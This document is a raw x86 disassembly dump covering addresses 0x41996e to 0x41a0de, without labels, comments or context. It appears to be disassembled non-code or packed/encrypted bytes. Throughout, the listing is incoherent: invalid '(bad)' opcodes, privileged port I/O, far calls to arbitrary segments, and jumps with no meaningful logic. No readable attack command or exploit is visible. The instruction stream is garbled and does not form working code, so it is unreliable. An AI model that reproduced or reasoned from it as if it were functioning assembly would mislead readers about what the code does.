  41996e:	push   esp
  41996f:	lds    esi,FWORD PTR [bx+di+0x2007]
  419974:	mov    ds:0x9154ecfc,al
  419979:	add    BYTE PTR [eax+eiz*4],0xf6
  41997d:	hlt    
  41997e:	jge    0x4199c8
  419980:	ds lahf 
  419982:	test   DWORD PTR [ecx+0x62],ecx
  419985:	ins    DWORD PTR es:[edi],dx
  419986:	push   ss
  419987:	in     al,dx
  419988:	dec    edx
  419989:	mov    ds:0x63d23d1,eax
  41998e:	loope  0x41993a
  419990:	inc    esp
  419991:	xchg   ecx,eax
  419992:	jns    0x419935
  419994:	aad    0x5b
  419996:	cs clc 
  419998:	cmp    bh,BYTE PTR [esi-0x5]
  41999b:	push   0x7724f904
  4199a0:	jo     0x419a1d
  4199a2:	and    esi,ebp
  4199a4:	sahf   
  4199a5:	add    edx,DWORD PTR [ecx+ebp*4-0x7a]
  4199a9:	dec    esi
  4199aa:	add    al,0x83
  4199ac:	xchg   esp,eax
  4199ad:	ret    
  4199ae:	imul   ebx,DWORD PTR [edx],0x139ca8df
  4199b4:	lods   al,BYTE PTR ds:[esi]
  4199b5:	jae    0x4199e2
  4199b7:	rcr    DWORD PTR [esi],1
  4199b9:	pop    es
  4199ba:	outs   dx,DWORD PTR ds:[esi]
  4199bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199bc:	mov    bh,0x78
  4199be:	js     0x419a35
  4199c0:	cmp    DWORD PTR [edx+0x7],edx
  4199c3:	sub    DWORD PTR [ebx],0x15
  4199c6:	fcomp  st(5)
  4199c8:	jmp    0x419a02
  4199ca:	mov    esi,0x79135d78
  4199cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199d0:	mov    ch,0xee
  4199d2:	pop    DWORD PTR [ebp-0xf1016fb]
  4199d8:	or     esp,DWORD PTR [esp+eax*1+0x8]
  4199dc:	xor    eax,0xa775cfae
  4199e1:	jle    0x4199ad
  4199e3:	div    BYTE PTR ds:0xa5b9a34a
  4199e9:	fs mov eax,0x9be56f9d
  4199ef:	mov    ch,0xbf
  4199f1:	xlat   BYTE PTR ds:[ebx]
  4199f2:	ins    DWORD PTR es:[edi],dx
  4199f3:	je     0x419983
  4199f5:	jg     0x4199ca
  4199f7:	jae    0x4199f2
  4199f9:	cmp    al,0x73
  4199fb:	sub    DWORD PTR [edi+esi*4],eax
  4199fe:	mov    bl,BYTE PTR [ebx-0x4c66add6]
  419a04:	xchg   ecx,eax
  419a05:	adc    al,BYTE PTR [edi+ebx*4]
  419a08:	sub    al,0x20
  419a0a:	mov    DWORD PTR [edi],esp
  419a0c:	adc    al,0xbc
  419a0e:	in     al,0x98
  419a10:	and    ebx,DWORD PTR [edi-0x34c76d59]
  419a16:	cmp    ecx,DWORD PTR [edi]
  419a18:	inc    edx
  419a19:	imul   ecx,DWORD PTR [esi+0x3ebcc297],0x1274fc3a
  419a23:	mul    DWORD PTR [esi-0x61]
  419a26:	mov    ch,0xfc
  419a28:	xchg   esp,eax
  419a29:	repz xchg ch,cl
  419a2c:	sar    BYTE PTR [ebx+0x169efec1],0xa8
  419a33:	cmc    
  419a34:	fldcw  WORD PTR [edi+edi*8]
  419a37:	or     BYTE PTR [ebp+edi*2-0x2caf53fd],0xe3
  419a3f:	test   al,0xa5
  419a42:	scas   al,BYTE PTR es:[edi]
  419a43:	in     eax,dx
  419a44:	jg     0x419a8b
  419a46:	jge    0x419a1d
  419a48:	xor    esi,DWORD PTR [ebx-0x12257518]
  419a4e:	mov    ecx,0xab7738cd
  419a53:	mov    BYTE PTR [edi+ecx*1+0x46c45bd6],bh
  419a5a:	(bad)  
  419a5b:	stos   DWORD PTR es:[edi],eax
  419a5c:	cmp    BYTE PTR [eax+0x48],0xb4
  419a60:	cs aaa 
  419a62:	adc    edx,DWORD PTR [eax]
  419a64:	jo     0x4199fb
  419a66:	daa    
  419a67:	add    eax,0xff72bfbe
  419a6c:	sahf   
  419a6d:	dec    ebx
  419a6e:	scas   al,BYTE PTR es:[edi]
  419a6f:	lahf   
  419a70:	push   edi
  419a71:	mov    edi,0xd29c9b85
  419a76:	add    edi,esi
  419a78:	xlat   BYTE PTR ds:[ebx]
  419a79:	mov    bl,0x4a
  419a7b:	call   FWORD PTR [ecx]
  419a7d:	xchg   edx,eax
  419a7e:	mov    eax,0xd26d5eb5
  419a83:	push   esi
  419a84:	cwde   
  419a85:	add    BYTE PTR [eax],bh
  419a87:	cld    
  419a88:	lock add ecx,DWORD PTR [ecx+0x3b5c5196]
  419a8f:	aad    0x29
  419a91:	nop
  419a92:	xchg   eax,ecx
  419a94:	loope  0x419a21
  419a96:	sbb    al,0xad
  419a98:	retf   0x70ff
  419a9b:	cld    
  419a9c:	add    al,0x2b
  419a9e:	push   ebx
  419a9f:	add    eax,0xdb23c635
  419aa4:	push   esi
  419aa5:	fisub  WORD PTR [esi]
  419aa7:	mov    esi,0x6e995d6d
  419aac:	sbb    esp,ecx
  419aae:	mov    cl,0x7c
  419ab0:	adc    al,0xdd
  419ab2:	ss std 
  419ab4:	(bad)  
  419ab5:	je     0x419acb
  419ab7:	xchg   BYTE PTR [ebp+0x5f25669c],dh
  419abd:	mov    ecx,0xe4856a6d
  419ac2:	cmp    eax,0xb0baca5a
  419ac7:	loopne 0x419acd
  419ac9:	call   0x4f1:0x3f2d6dee
  419ad0:	dec    esi
  419ad1:	int3   
  419ad2:	lods   al,BYTE PTR ds:[esi]
  419ad3:	xchg   esp,eax
  419ad4:	pop    esp
  419ad5:	in     eax,0xe5
  419ad7:	push   esp
  419ad8:	(bad)  
  419ad9:	test   al,0xd7
  419adb:	add    BYTE PTR [edi+0x66],0xcf
  419adf:	jl     0x419ab0
  419ae1:	xchg   DWORD PTR [esp+ecx*1+0x5592abca],ebx
  419ae8:	mov    eax,ds:0x190c670f
  419aed:	stc    
  419aee:	cmp    edx,DWORD PTR [edi-0x15]
  419af1:	aad    0x79
  419af3:	xchg   esp,eax
  419af4:	and    BYTE PTR [ebx],ch
  419af6:	leave  
  419af7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419af8:	jg     0x419af8
  419afa:	imul   edi
  419afc:	sahf   
  419afd:	fadd   DWORD PTR [edx+0x29a67394]
  419b03:	popf   
  419b04:	inc    ebp
  419b05:	jo     0x419aa3
  419b07:	xchg   ecx,eax
  419b08:	aas    
  419b09:	rcr    esi,cl
  419b0b:	add    al,0x40
  419b0d:	std    
  419b0e:	test   al,0x9d
  419b10:	adc    DWORD PTR [ebp-0x627bebdc],edi
  419b16:	cmc    
  419b17:	mov    ebx,0xffc01ad2
  419b1c:	jecxz  0x419acc
  419b1e:	jo     0x419b4d
  419b20:	sub    BYTE PTR [eax-0x264894fb],0xc0
  419b27:	cwde   
  419b28:	mov    ch,0xa4
  419b2a:	mov    ds:0x72cbfa6e,eax
  419b2f:	jnp    0x419b77
  419b31:	jnp    0x419b33
  419b33:	and    bl,dh
  419b35:	into   
  419b36:	mov    esp,0x3b96d0c
  419b3b:	cwde   
  419b3c:	xor    DWORD PTR [esi*2-0x28200518],ebx
  419b43:	addr16 fwait
  419b45:	mov    WORD PTR [ecx+0x25],ss
  419b48:	int    0x27
  419b4a:	ss xor al,al
  419b4d:	enter  0x6df9,0xc
  419b51:	mov    ebp,0x924d9f91
  419b56:	fs (bad) 
  419b58:	jmp    0x1decc461
  419b5d:	add    edi,edi
  419b5f:	xor    edi,DWORD PTR [edi-0xf1bb96d]
  419b65:	test   DWORD PTR [ebx-0x6a],esp
  419b68:	daa    
  419b69:	leave  
  419b6a:	(bad)  
  419b6b:	rcr    BYTE PTR [edx],1
  419b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b6e:	fistp  DWORD PTR [edx]
  419b70:	jnp    0x419bd6
  419b72:	xchg   DWORD PTR [esi],edi
  419b74:	mov    ah,ch
  419b76:	and    eax,0x47b4c2c
  419b7b:	add    eax,0xe5251b99
  419b80:	sahf   
  419b81:	xor    dl,bh
  419b83:	cdq    
  419b84:	sub    dl,BYTE PTR [eax]
  419b86:	mov    esi,0x3cf01449
  419b8b:	adc    ebp,edx
  419b8d:	clc    
  419b8e:	fneni(8087 only) 
  419b90:	test   BYTE PTR [eax+0x36],0xab
  419b94:	in     eax,0xe5
  419b96:	cmp    al,0xb6
  419b98:	arpl   WORD PTR [ecx+ecx*4],dx
  419b9b:	sub    BYTE PTR [eax],0xd0
  419b9e:	add    eax,0x62475357
  419ba3:	std    
  419ba4:	mov    ch,0xad
  419ba6:	nop
  419ba7:	add    DWORD PTR [edx-0x398beada],ecx
  419bad:	cmp    eax,0x242a27a7
  419bb2:	popf   
  419bb3:	mov    edx,0x9ca69db7
  419bb8:	inc    esp
  419bb9:	cld    
  419bba:	(bad)  
  419bbd:	mov    al,ds:0x4f81e569
  419bc2:	(bad)
  419bc6:	xchg   esp,eax
  419bc7:	pop    edi
  419bc8:	lods   al,BYTE PTR ds:[esi]
  419bc9:	xchg   esi,eax
  419bca:	shl    al,cl
  419bcc:	leave  
  419bcd:	std    
  419bce:	cmp    al,0x83
  419bd0:	int3   
  419bd1:	inc    ebx
  419bd2:	in     al,0xa9
  419bd4:	mov    ecx,0x57f2abfe
  419bd9:	inc    ecx
  419bda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bdb:	sbb    edi,DWORD PTR [edx]
  419bdd:	adc    DWORD PTR [ebx],0xffffffd2
  419be0:	repz enter 0xf6bd,0xef
  419be5:	(bad)  
  419be6:	enter  0xc744,0x2c
  419bea:	outs   dx,DWORD PTR ds:[esi]
  419beb:	ror    ecx,0xf1
  419bee:	push   edi
  419bef:	add    al,0x18
  419bf1:	push   ebp
  419bf2:	loop   0x419b77
  419bf4:	and    BYTE PTR [ecx-0xd],al
  419bf7:	mov    dh,0x35
  419bf9:	mov    ah,bh
  419bfb:	sub    ecx,edx
  419bfd:	push   es
  419bfe:	push   edx
  419bff:	cdq    
  419c00:	lods   eax,DWORD PTR ds:[esi]
  419c01:	pop    ebp
  419c02:	xor    ah,dh
  419c04:	aam    0xd2
  419c06:	imul   eax,DWORD PTR [eax+0x1dd49bc7],0x5e
  419c0d:	lea    edx,[edx+ebx*8-0x287e0d86]
  419c14:	mov    ebp,0x670a3587
  419c19:	ds test al,0x4f
  419c1c:	cmp    ecx,edi
  419c1e:	retf   0xe120
  419c21:	mov    esp,0x67a31edb
  419c26:	rol    BYTE PTR [esi],1
  419c28:	mov    eax,ds:0x320386f3
  419c2d:	xlat   BYTE PTR ds:[ebx]
  419c2e:	retf   0xae5c
  419c31:	push   esi
  419c32:	xchg   BYTE PTR [eax+edx*2],cl
  419c35:	leave  
  419c36:	arpl   WORD PTR [ecx],si
  419c38:	out    0x6d,eax
  419c3a:	popf   
  419c3b:	inc    esi
  419c3c:	jnp    0x419cb0
  419c3e:	dec    eax
  419c3f:	sbb    al,0xa9
  419c41:	dec    edi
  419c42:	stos   DWORD PTR es:[edi],eax
  419c43:	outs   dx,DWORD PTR ds:[esi]
  419c44:	mov    ecx,0x38b0a47a
  419c49:	sbb    bl,BYTE PTR ds:[esi-0x14]
  419c4d:	inc    esp
  419c4e:	inc    esp
  419c4f:	scas   eax,DWORD PTR es:[edi]
  419c50:	or     al,0x3f
  419c52:	in     eax,0x4
  419c54:	outs   dx,DWORD PTR ds:[esi]
  419c55:	push   ebp
  419c56:	mov    edi,0x41c2d8c2
  419c5b:	push   ss
  419c5c:	mov    dh,0x97
  419c5e:	aam    0x8a
  419c60:	out    dx,al
  419c61:	es ds in al,0xdb
  419c65:	sub    al,0xf8
  419c67:	cli    
  419c68:	push   edx
  419c69:	pop    ss
  419c6a:	stc    
  419c6b:	fiadd  DWORD PTR [ecx]
  419c6d:	mov    eax,0xf3bf9d55
  419c72:	ss xchg ebp,eax
  419c74:	cs pushf 
  419c76:	or     al,0x1f
  419c78:	das    
  419c79:	cld    
  419c7a:	pop    es
  419c7b:	adc    BYTE PTR [edx+0x5065367],al
  419c81:	gs (bad) 
  419c83:	mul    DWORD PTR [eax-0x431b651f]
  419c89:	xchg   esp,eax
  419c8a:	dec    ebx
  419c8b:	pop    esi
  419c8c:	xlat   BYTE PTR ds:[ebx]
  419c8d:	push   edx
  419c8e:	dec    ebp
  419c8f:	iret   
  419c90:	sbb    ecx,esp
  419c92:	nop
  419c93:	pop    ebp
  419c94:	ins    BYTE PTR es:[edi],dx
  419c95:	mov    edi,0x24625154
  419c9a:	data16 mov ds:0x3f93915a,al
  419ca0:	inc    edi
  419ca1:	push   ss
  419ca2:	inc    ebx
  419ca3:	mov    esi,0xe24d58b
  419ca8:	add    BYTE PTR [ebp-0x26],dl
  419cab:	clc    
  419cac:	xor    BYTE PTR [ecx+0x57625139],cl
  419cb2:	push   0x86c07dd5
  419cb7:	jmp    0x419c9d
  419cb9:	out    0xcd,al
  419cbb:	xor    al,0x8f
  419cbd:	call   0x710d:0x2c2ff7f6
  419cc4:	cmc    
  419cc5:	cld    
  419cc6:	push   ebx
  419cc7:	inc    ebx
  419cc8:	fisubr WORD PTR [eax-0x63]
  419ccb:	jmp    0x5288:0xc5236460
  419cd2:	xchg   BYTE PTR [eax+0x2afc9883],dh
  419cd8:	push   ds
  419cd9:	xor    eax,0xffaca946
  419cde:	add    cl,cl
  419ce0:	popa   
  419ce1:	pop    edx
  419ce2:	or     eax,0x74dcd99b
  419ce7:	cmp    al,0xe5
  419ce9:	jp     0x419c7b
  419ceb:	in     eax,dx
  419cec:	iret   
  419ced:	cmp    al,0x90
  419cef:	mov    bh,dl
  419cf1:	and    DWORD PTR [ebp+0x30],0x4e
  419cf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cf6:	adc    BYTE PTR [ebp-0x44],ah
  419cf9:	in     eax,0x7e
  419cfb:	leave  
  419cfc:	hlt    
  419cfd:	lods   al,BYTE PTR ds:[esi]
  419cfe:	push   ebx
  419cff:	adc    al,0x78
  419d01:	inc    ebx
  419d02:	fucomip st,st(3)
  419d04:	ss or  ebx,eax
  419d07:	xor    BYTE PTR [eax-0x6c2c74ff],al
  419d0d:	inc    ebx
  419d0e:	jg     0x419d81
  419d10:	repz xor al,BYTE PTR [eax+0x1]
  419d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d15:	fld    QWORD PTR [esi+0x70]
  419d18:	fild   DWORD PTR [edi+0x107b09f9]
  419d1e:	jg     0x419d4f
  419d20:	icebp  
  419d21:	cli    
  419d22:	aas    
  419d23:	imul   eax,DWORD PTR [eax],0x38
  419d26:	stos   DWORD PTR es:[edi],eax
  419d27:	in     eax,dx
  419d28:	retf   0x724f
  419d2b:	sub    BYTE PTR [edi+0x34],ch
  419d2e:	ror    BYTE PTR [ecx],cl
  419d30:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  419d32:	fdiv   DWORD PTR [edx-0x38]
  419d35:	mov    ebx,0xf30d1207
  419d3a:	aaa    
  419d3b:	jb     0x419cda
  419d3d:	xor    al,0xa
  419d3f:	sahf   
  419d40:	mov    bl,BYTE PTR [ebp+0x726a0b6a]
  419d46:	aad    0xc5
  419d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d49:	fs dec ecx
  419d4b:	xor    al,0x89
  419d4d:	(bad)  
  419d4e:	jns    0x419d68
  419d50:	clc    
  419d51:	test   DWORD PTR ds:0xd649cfc4,ecx
  419d57:	sbb    al,0x9e
  419d59:	or     esp,DWORD PTR [ebp-0x13]
  419d5c:	aas    
  419d5d:	out    0x76,eax
  419d5f:	adc    bl,bl
  419d61:	sbb    BYTE PTR [esi-0x7b],ah
  419d64:	pop    esp
  419d65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d66:	stos   DWORD PTR es:[edi],eax
  419d67:	ret    
  419d68:	mov    esi,0x2cdd4d0d
  419d6d:	ret    
  419d6e:	imul   eax,DWORD PTR [ecx-0x5a2cb237],0x6a1f837f
  419d78:	dec    ebx
  419d79:	aam    0x81
  419d7b:	or     dh,BYTE PTR [ebx]
  419d7d:	mov    bh,BYTE PTR [esi]
  419d7f:	test   DWORD PTR [edi+0x3e44a29a],edi
  419d85:	add    ah,ah
  419d87:	inc    edx
  419d88:	and    eax,0x8cea6f5c
  419d8d:	xchg   edx,eax
  419d8e:	(bad)  
  419d8f:	ficomp WORD PTR [esp+ecx*8]
  419d92:	leave  
  419d93:	ret    
  419d94:	lods   eax,DWORD PTR ds:[esi]
  419d95:	dec    esp
  419d96:	mov    ah,0x6d
  419d98:	add    BYTE PTR [ecx+0x2bd162d9],ah
  419d9e:	fild   DWORD PTR [edi]
  419da0:	fwait
  419da1:	into   
  419da2:	xchg   edi,eax
  419da3:	inc    edi
  419da4:	pop    ds
  419da5:	retf   0xceba
  419da8:	out    dx,eax
  419da9:	inc    edi
  419daa:	push   0xf0da0760
  419daf:	jl     0x419e18
  419db1:	popa   
  419db2:	repz mov dh,0x9d
  419db5:	sbb    DWORD PTR [eax-0x19bf1b8b],eax
  419dbb:	dec    ebx
  419dbc:	int    0x5c
  419dbe:	fldenv [ecx-0x24]
  419dc1:	xor    eax,DWORD PTR [edx]
  419dc3:	sar    BYTE PTR [ebp+esi*4-0x6d],cl
  419dc7:	popa   
  419dc8:	clc    
  419dc9:	dec    ebx
  419dca:	and    BYTE PTR [edi-0x1217cce1],bl
  419dd0:	push   es
  419dd1:	cld    
  419dd2:	hlt    
  419dd3:	sub    al,0x46
  419dd5:	bswap  ebp
  419dd7:	pop    ebp
  419dd8:	clc    
  419dd9:	retf   0x74ee
  419ddc:	lock xlat BYTE PTR ds:[ebx]
  419dde:	or     BYTE PTR [ebp+0xe],cl
  419de1:	jnp    0x419d81
  419de3:	xchg   ecx,eax
  419de4:	mov    eax,0xec2f179f
  419de9:	retf   
  419dea:	cwde   
  419deb:	stos   BYTE PTR es:[edi],al
  419dec:	dec    ebx
  419ded:	in     eax,0x51
  419def:	and    al,al
  419df1:	pushf  
  419df2:	jnp    0x419df3
  419df4:	je     0x419d95
  419df6:	push   ebp
  419df7:	dec    eax
  419df8:	jecxz  0x419df2
  419dfa:	leave  
  419dfb:	hlt    
  419dfc:	fst    QWORD PTR ss:[ecx-0x3a]
  419e00:	lahf   
  419e01:	repz leave 
  419e03:	pop    ebp
  419e04:	aaa    
  419e05:	jp     0x419da4
  419e07:	push   edi
  419e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e09:	imul   edx,DWORD PTR [eax-0xda456ef],0x712c89fd
  419e13:	das    
  419e14:	mov    dh,0xc0
  419e16:	cld    
  419e17:	loopne 0x419de9
  419e19:	dec    ebx
  419e1a:	and    eax,edi
  419e1c:	jge    0x419e2f
  419e1e:	jae    0x419e1c
  419e20:	xchg   BYTE PTR ds:0xc1369a8c,dh
  419e26:	fwait
  419e27:	stos   DWORD PTR es:[edi],eax
  419e28:	(bad)  
  419e29:	daa    
  419e2a:	fwait
  419e2b:	ja     0x419e4e
  419e2d:	loop   0x419e7f
  419e2f:	mov    ecx,0x9d522e7c
  419e34:	push   ecx
  419e35:	push   ecx
  419e36:	inc    eax
  419e37:	js     0x419df8
  419e39:	inc    edx
  419e3a:	rcr    BYTE PTR [ecx+eiz*8+0x7a],1
  419e3e:	in     al,dx
  419e3f:	inc    edx
  419e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e41:	jle    0x419dd5
  419e43:	mov    ebp,0x7662ebcf
  419e48:	xor    eax,0x80a7c658
  419e4d:	and    eax,0xb7de2c1f
  419e52:	xchg   edx,eax
  419e53:	or     ah,ah
  419e55:	dec    esp
  419e56:	push   ss
  419e57:	aad    0xb9
  419e59:	and    ah,BYTE PTR [edx-0x547abb4b]
  419e5f:	(bad)  
  419e61:	mov    esi,0xae971149
  419e66:	cld    
  419e67:	push   eax
  419e68:	add    DWORD PTR [ebp+0x4287fa3e],edi
  419e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e6f:	pop    ebx
  419e70:	lods   eax,DWORD PTR ds:[esi]
  419e71:	in     eax,dx
  419e72:	jne    0x419e04
  419e74:	popf   
  419e75:	sub    ebx,ecx
  419e77:	shr    ebp,0x98
  419e7a:	xor    eax,0x2c837a59
  419e7f:	or     al,bl
  419e81:	xor    DWORD PTR [esi+0x5d],ecx
  419e84:	inc    ebp
  419e85:	sbb    ebx,esi
  419e87:	pusha  
  419e88:	mov    eax,0xefad257d
  419e8d:	add    BYTE PTR [eax],0x49
  419e90:	loopne 0x419e17
  419e92:	pop    ss
  419e93:	pop    ecx
  419e94:	xchg   ebp,eax
  419e95:	shl    esp,cl
  419e97:	loop   0x419e36
  419e99:	out    dx,eax
  419e9a:	bound  ecx,QWORD PTR [edx]
  419e9c:	jbe    0x419efe
  419e9e:	jo     0x419e67
  419ea0:	int    0x16
  419ea2:	pop    edi
  419ea3:	in     eax,dx
  419ea4:	jne    0x419e83
  419ea6:	mov    eax,0xca06f7c4
  419eab:	push   esp
  419eac:	jae    0x419e91
  419eae:	mov    ecx,esp
  419eb0:	test   al,bh
  419eb2:	lahf   
  419eb3:	cmp    edi,DWORD PTR [ebx]
  419eb5:	(bad)  
  419eb6:	fxch   st(7)
  419eb8:	push   ebx
  419eb9:	mov    edx,0xbbb2a80c
  419ebe:	jbe    0x419ea3
  419ec0:	stos   DWORD PTR es:[edi],eax
  419ec1:	stc    
  419ec2:	push   edx
  419ec3:	scas   eax,DWORD PTR es:[edi]
  419ec4:	sbb    edx,DWORD PTR [esi]
  419ec6:	cmc    
  419ec7:	or     al,0x68
  419ec9:	mov    al,ds:0x2bfcbe19
  419ece:	ja     0x419e81
  419ed0:	pop    edx
  419ed1:	addr16 ja 0x419e5b
  419ed4:	adc    edi,DWORD PTR [ecx-0x875c059]
  419eda:	pop    ss
  419edb:	pop    esp
  419edc:	sbb    edi,DWORD PTR [ecx-0x263fd4a6]
  419ee2:	cs jg  0x419eeb
  419ee5:	jne    0x419f2f
  419ee7:	cs mov edi,0x3c167b0f
  419eed:	outs   dx,BYTE PTR ds:[esi]
  419eee:	sub    dh,bl
  419ef0:	mov    ah,ch
  419ef2:	test   eax,0x98e83a94
  419ef7:	daa    
  419ef8:	mov    ebp,cs
  419efa:	and    DWORD PTR [edx-0x33],esp
  419efd:	xlat   BYTE PTR ds:[ebx]
  419efe:	into   
  419eff:	js     0x419f18
  419f01:	sub    BYTE PTR [ebx-0x34],dl
  419f04:	nop
  419f05:	rcl    BYTE PTR [ebp+0x15c3c7f6],1
  419f0b:	pusha  
  419f0c:	inc    ecx
  419f0d:	sub    bl,BYTE PTR [edx-0x165b7ff8]
  419f13:	div    BYTE PTR [ebp+0x74]
  419f16:	bound  edx,QWORD PTR [edx-0x61]
  419f19:	stos   DWORD PTR es:[edi],eax
  419f1a:	push   esp
  419f1b:	(bad)
  419f1e:	out    0x13,eax
  419f20:	je     0x419edf
  419f22:	imul   eax,ebp,0x80d8db01
  419f28:	or     bl,BYTE PTR [edi]
  419f2a:	inc    ebp
  419f2b:	xchg   esp,eax
  419f2c:	ficom  WORD PTR [edx]
  419f2e:	mov    ebp,0x6e778245
  419f33:	push   ss
  419f34:	jb     0x419fa2
  419f36:	ins    DWORD PTR es:[edi],dx
  419f37:	pop    edi
  419f38:	mov    DWORD PTR [esi],edx
  419f3a:	inc    esp
  419f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f3c:	mov    esp,0x93806824
  419f41:	into   
  419f42:	scas   eax,DWORD PTR es:[edi]
  419f43:	cmp    eax,0x99f9ca22
  419f48:	adc    eax,0xef4c984f
  419f4d:	aaa    
  419f4e:	xlat   BYTE PTR ds:[ebx]
  419f4f:	inc    esi
  419f50:	leave  
  419f51:	loopne 0x419ee8
  419f53:	jno    0x419f4d
  419f55:	lods   eax,DWORD PTR ds:[esi]
  419f56:	mov    dh,0xa9
  419f58:	aaa    
  419f59:	int3   
  419f5a:	loop   0x419f73
  419f5c:	mov    edi,0x82c381c5
  419f61:	cdq    
  419f62:	xchg   edi,eax
  419f63:	jmp    0x419f1f
  419f65:	data16 int3 
  419f67:	inc    ebp
  419f68:	test   DWORD PTR [ebp-0x324060c4],ebp
  419f6e:	or     ah,BYTE PTR [ecx-0x48ea0c05]
  419f74:	cmc    
  419f75:	pop    ss
  419f76:	retf   0xc158
  419f79:	rcl    BYTE PTR [ebp+0x36d7045c],0xd9
  419f80:	and    esi,DWORD PTR [eax]
  419f82:	pop    ds
  419f83:	fistp  QWORD PTR [ebp+ebp*8+0x466931f5]
  419f8a:	or     ebp,ecx
  419f8c:	mov    bl,0x30
  419f8e:	out    dx,eax
  419f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f90:	and    edx,ebp
  419f92:	imul   ecx,DWORD PTR [edi+0x5dbf891d],0xad05bf03
  419f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f9d:	xor    ah,BYTE PTR [edx-0x4d6a61a1]
  419fa3:	jns    0x419ffd
  419fa5:	icebp  
  419fa6:	pop    edi
  419fa7:	cld    
  419fa8:	push   edx
  419fa9:	bound  ebp,QWORD PTR [ebx+edx*4-0x6564d79d]
  419fb0:	adc    ebx,DWORD PTR [esi-0x63]
  419fb3:	sub    ebp,DWORD PTR [eax-0x1e]
  419fb6:	sahf   
  419fb7:	loop   0x419ffb
  419fb9:	jb     0x419f99
  419fbb:	push   0x77a14d43
  419fc0:	arpl   WORD PTR [edx*8+0x3365e2d9],bx
  419fc7:	dec    ebp
  419fc8:	sbb    DWORD PTR [eax-0x6d],edi
  419fcb:	(bad)  
  419fcc:	addr16 mul bl
  419fcf:	xor    eax,0xd78e1f2e
  419fd4:	ficomp WORD PTR [edx]
  419fd6:	dec    esp
  419fd7:	loopne 0x419f6c
  419fd9:	mov    edx,0xa794d0f1
  419fde:	sbb    DWORD PTR [esi],ecx
  419fe0:	cmc    
  419fe1:	add    DWORD PTR [edi+0x5a3b0680],ebx
  419fe7:	popf   
  419fe8:	push   edx
  419fe9:	ror    DWORD PTR [ebp-0x23],cl
  419fec:	push   edx
  419fed:	cmp    edi,eax
  419fef:	out    dx,al
  419ff0:	pop    es
  419ff1:	mov    edi,0xd342e90e
  419ff6:	dec    edi
  419ff7:	inc    cx
  419ff9:	adc    DWORD PTR [ecx-0x45],edx
  419ffc:	popf   
  419ffd:	push   eax
  419ffe:	icebp  
  419fff:	sahf   
  41a000:	mov    ch,0x9
  41a002:	(bad)  
  41a003:	hlt    
  41a004:	cmp    ah,BYTE PTR [ebp+0x3]
  41a007:	adc    eax,0x42e9e51f
  41a00c:	ret    
  41a00d:	repz ret 
  41a00f:	fucomip st,st(2)
  41a011:	retf   0x350d
  41a014:	sbb    edx,edx
  41a016:	xor    al,bl
  41a018:	int3   
  41a019:	sbb    DWORD PTR ds:0xc40052df,0x9b2264fe
  41a023:	push   ebx
  41a024:	xor    ch,ch
  41a026:	mov    al,ds:0xfede8746
  41a02b:	mov    edi,0x97091be8
  41a030:	shufps xmm0,XMMWORD PTR ds:0x5b48f42,0x9d
  41a038:	cmp    eax,0xa8c1f4cf
  41a03d:	xor    ecx,DWORD PTR [ebx]
  41a03f:	add    al,0x32
  41a041:	xchg   edx,eax
  41a042:	push   DWORD PTR [eax-0x164e52d4]
  41a048:	sub    edx,0x3d0c6c4e
  41a04e:	xor    DWORD PTR [eax+0xdf29d70],ecx
  41a054:	sub    DWORD PTR [esi+0x25],0x8bdc8368
  41a05b:	fldcw  WORD PTR gs:[edx]
  41a05e:	pop    ds
  41a05f:	mov    ch,0xff
  41a061:	iret   
  41a062:	dec    esp
  41a063:	and    dl,BYTE PTR [ebx+0x7edced1b]
  41a069:	and    ebp,DWORD PTR [eax-0x10]
  41a06c:	pop    ds
  41a06d:	jne    0x41a08b
  41a06f:	(bad)  
  41a071:	pop    eax
  41a072:	rcr    DWORD PTR [edi+0x7399af7b],1
  41a078:	bound  ebx,QWORD PTR [ebp-0x6f2c9149]
  41a07e:	cwde   
  41a07f:	sbb    ebp,DWORD PTR [ecx+0x6f633146]
  41a085:	cdq    
  41a086:	nop
  41a087:	pusha  
  41a088:	dec    esi
  41a089:	mov    al,0x6
  41a08b:	out    dx,al
  41a08c:	mov    al,ds:0x369f7362
  41a091:	daa    
  41a092:	in     eax,dx
  41a093:	adc    ecx,DWORD PTR [ebx+ebp*4-0x3f6ef5e3]
  41a09a:	jnp    0x41a05e
  41a09c:	add    esp,DWORD PTR [eax]
  41a09e:	iret   
  41a09f:	or     BYTE PTR [eax+0x2c],ch
  41a0a2:	cmp    al,0x20
  41a0a4:	xor    eax,0x16c82601
  41a0a9:	pop    ebp
  41a0aa:	sbb    ah,cl
  41a0ac:	adc    al,0x2
  41a0ae:	test   esi,ecx
  41a0b0:	in     al,0xc2
  41a0b2:	dec    edx
  41a0b3:	or     dh,bh
  41a0b5:	push   edx
  41a0b6:	mov    al,ds:0x71d95f31
  41a0bb:	retf   0x9f42
  41a0be:	int3   
  41a0bf:	mov    BYTE PTR [ebx+ecx*4-0x35],ah
  41a0c3:	pop    esp
  41a0c4:	add    al,0xec
  41a0c6:	shl    DWORD PTR [eax+ecx*2-0x15],cl
  41a0ca:	inc    eax
  41a0cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0cc:	into   
  41a0cd:	cld    
  41a0ce:	shl    ebp,0x40
  41a0d1:	pop    esp
  41a0d2:	push   ebp
  41a0d3:	push   ds
  41a0d4:	push   ebx
  41a0d5:	outs   dx,DWORD PTR ds:[esi]
  41a0d6:	sar    DWORD PTR [ebx-0x12],0x53
  41a0da:	jno    0x41a0e2
  41a0dc:	pop    ebp
  41a0dd:	sti    
  41a0de:	mov    eax,ds:0x597eba9e
